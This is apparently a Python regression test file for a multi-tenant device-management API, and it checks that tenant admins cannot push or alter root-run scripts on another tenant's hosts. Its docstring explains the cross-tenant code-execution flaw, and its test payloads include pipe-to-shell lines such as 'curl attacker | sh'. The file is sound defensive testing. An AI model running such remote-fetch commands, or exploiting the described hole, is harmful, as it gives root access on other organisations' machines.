#!/usr/bin/env python3
"""A custom script's assignment list is a root-code-execution target.

`assigned_devices` is not a label. The heartbeat hands every script assigned to
a device straight to that device's agent, which runs the body as root — the
agent's own comment says so. The only brake is `require-signed-commands`, which
is opt-in and off by default.

So the entire subsystem had no tenant model, and a tenant admin could:

  * create a script assigned to another tenant's host (root RCE),
  * do the same through update,
  * edit the BODY of a script already assigned elsewhere — same execution on
    the same foreign host, with no assignment change to notice,
  * read a foreign script's body (which may embed credentials),
  * delete one, taking that tenant's monitoring with it,
  * apply a profile containing a script they cannot read.

Six doors into one room. The half-applied-rule shape exactly: the profile-apply
handler ALREADY filtered its device list and carried a `# SEC:` comment saying
so, which is what made the file read as though the rule was enforced.

WHY A TENANT ADMIN SLIPS THROUGH, restated because it is the root of the whole
class: their role IS `admin`, so `require_admin_auth()` passes, and
`_caller_scope()` is None, so every `if scope is not None:` gate passes too.
`_scope_filter_devices` is the helper that folds in both role scope and the
tenant filter, and it no-ops for an unscoped superadmin — which is why the
superadmin control below must keep passing.
"""
import os
import tempfile
import unittest

os.environ.setdefault('RP_DATA_DIR', tempfile.mkdtemp(prefix='rp-cstenant-'))

import importlib.util  # noqa: E402
from pathlib import Path  # noqa: E402

_CGI = Path(__file__).resolve().parent.parent / 'server' / 'cgi-bin'
_spec = importlib.util.spec_from_file_location('api', _CGI / 'api.py')
api = importlib.util.module_from_spec(_spec)
import sys  # noqa: E402
sys.modules['api'] = api
_spec.loader.exec_module(api)


class _Base(unittest.TestCase):
    """Two tenants, one device each, and a caller who is admin of only one."""

    def setUp(self):
        api._LOAD_CACHE.clear()
        api.save(api.TENANTS_FILE, {'tenants': [
            {'id': 'tenantA', 'name': 'A'}, {'id': 'tenantB', 'name': 'B'}]})
        api.save(api.DEVICES_FILE, {
            'devA': {'name': 'A-host', 'tenant': 'tenantA'},
            'devB': {'name': 'SECRET-B-host', 'tenant': 'tenantB'},
        })
        api.save(api.CUSTOM_SCRIPTS_FILE, {})
        self._real = {n: getattr(api, n) for n in
                      ('require_auth', 'require_admin_auth', '_tenant_gate',
                       '_caller_scope', 'respond', 'audit_log')}
        api.audit_log = lambda *a, **k: None
        self.captured = []

        def _respond(status, data=None, *a, **k):
            self.captured.append((status, data))
            raise api.HTTPError(status, data)
        api.respond = _respond
        self.as_tenant_admin()

    def tearDown(self):
        for n, f in self._real.items():
            setattr(api, n, f)

    def as_tenant_admin(self):
        api.require_auth = lambda *a, **k: ('alice', 'admin')
        api.require_admin_auth = lambda *a, **k: 'alice'
        api._tenant_gate = lambda *a, **k: 'tenantA'
        api._caller_scope = lambda *a, **k: None

    def as_superadmin(self):
        api.require_auth = lambda *a, **k: ('root', 'admin')
        api.require_admin_auth = lambda *a, **k: 'root'
        api._tenant_gate = lambda *a, **k: None
        api._caller_scope = lambda *a, **k: None

    def call(self, fn, *args, body=None):
        """Run a handler and return (status, body). respond() raises."""
        self.captured = []
        api.get_json_body = lambda: (body or {})
        api.get_json_obj = lambda: (body or {})
        api._read_valid = lambda *a, **k: (body or {})
        try:
            fn(*args)
        except (api.HTTPError, SystemExit):
            pass
        return self.captured[-1] if self.captured else (None, None)

    def seed_foreign_script(self):
        """A script a superadmin legitimately assigned to the OTHER tenant."""
        api.save(api.CUSTOM_SCRIPTS_FILE, {'s1': {
            'id': 's1', 'name': 'theirs', 'body': 'echo secret-payload',
            'description': '', 'assigned_devices': ['devB'],
            'timeout': 30, 'created_at': 1, 'updated_at': 1,
            'created_by': 'root'}})


class TestTheFixtureIsRight(_Base):
    """Every assertion below is "the caller is refused", which a broken fixture
    produces just as reliably."""

    def test_the_caller_really_is_an_admin(self):
        api._LOAD_CACHE.clear()
        st, _ = self.call(api.handle_custom_script_create,
                          body={'name': 'mine', 'body': 'echo hi'})
        self.assertEqual(st, 201, 'the caller cannot even create a script — '
                                  'the refusals below would prove nothing')

    def test_the_two_devices_are_in_different_tenants(self):
        visible = api._scope_filter_devices(api.load(api.DEVICES_FILE) or {})
        self.assertIn('devA', visible)
        self.assertNotIn('devB', visible,
                         'the tenant fixture is not actually separating them')


class TestAssignmentCannotCrossATenant(_Base):

    def test_create_cannot_assign_to_a_foreign_device(self):
        api._LOAD_CACHE.clear()
        st, data = self.call(api.handle_custom_script_create,
                             body={'name': 'pwn', 'body': 'curl x | sh',
                                   'assigned_devices': ['devB']})
        self.assertEqual(st, 201)
        self.assertEqual(data.get('assigned_devices'), [])
        self.assertEqual(api._get_custom_scripts_for_device('devB'), [],
                         'the heartbeat would hand this to the other tenant’s '
                         'agent, which runs it as root')

    def test_update_cannot_assign_to_a_foreign_device(self):
        api._LOAD_CACHE.clear()
        _st, created = self.call(api.handle_custom_script_create,
                                 body={'name': 'mine', 'body': 'echo hi'})
        sid = created['id']
        st, data = self.call(api.handle_custom_script_update, sid,
                             body={'assigned_devices': ['devB']})
        self.assertEqual(st, 200)
        self.assertEqual(data.get('assigned_devices'), [])
        self.assertEqual(api._get_custom_scripts_for_device('devB'), [])

    def test_a_superadmin_may_still_assign_across_tenants(self):
        """The fix must not break the legitimate case it looks like."""
        api._LOAD_CACHE.clear()
        self.as_superadmin()
        st, data = self.call(api.handle_custom_script_create,
                             body={'name': 'fleetwide', 'body': 'echo hi',
                                   'assigned_devices': ['devA', 'devB']})
        self.assertEqual(st, 201)
        self.assertEqual(sorted(data.get('assigned_devices')), ['devA', 'devB'])


class TestAForeignScriptIsOutOfReachEntirely(_Base):
    """Filtering only `assigned_devices` would have left the wider door open:
    the body is the payload, and editing it needs no assignment change."""

    def setUp(self):
        super().setUp()
        self.seed_foreign_script()
        api._LOAD_CACHE.clear()

    def test_its_body_cannot_be_read(self):
        st, _ = self.call(api.handle_custom_script_get, 's1')
        self.assertEqual(st, 404)

    def test_its_body_cannot_be_rewritten(self):
        st, _ = self.call(api.handle_custom_script_update, 's1',
                          body={'body': 'curl attacker | sh'})
        self.assertEqual(st, 404)
        stored = (api.load(api.CUSTOM_SCRIPTS_FILE) or {})['s1']
        self.assertEqual(stored['body'], 'echo secret-payload',
                         'the body running as root on the other tenant’s host '
                         'was replaced')

    def test_it_cannot_be_deleted(self):
        st, _ = self.call(api.handle_custom_script_delete, 's1')
        self.assertEqual(st, 404)
        self.assertIn('s1', api.load(api.CUSTOM_SCRIPTS_FILE) or {})

    def test_it_is_not_listed(self):
        st, data = self.call(api.handle_custom_scripts_list)
        self.assertEqual(st, 200)
        ids = [s['id'] for s in data.get('scripts', [])]
        self.assertNotIn('s1', ids,
                         'the listing carries assigned_devices, so this hands '
                         'over another tenant’s device ids')

    def test_the_superadmin_can_still_see_and_edit_it(self):
        """Positive control: the refusals above must be about SCOPE, not about
        the script having become unreachable to everyone."""
        self.as_superadmin()
        api._LOAD_CACHE.clear()
        st, data = self.call(api.handle_custom_script_get, 's1')
        self.assertEqual(st, 200)
        self.assertEqual(data['body'], 'echo secret-payload')


class TestAnUnassignedScriptStaysShared(_Base):
    """A script assigned to nothing executes nowhere. Treating the unassigned
    pool as shared is what keeps the ordinary single-org install unchanged."""

    def test_it_is_reachable(self):
        self.assertTrue(api._custom_script_reachable({'assigned_devices': []}))
        self.assertTrue(api._custom_script_reachable({}))


if __name__ == '__main__':
    unittest.main()
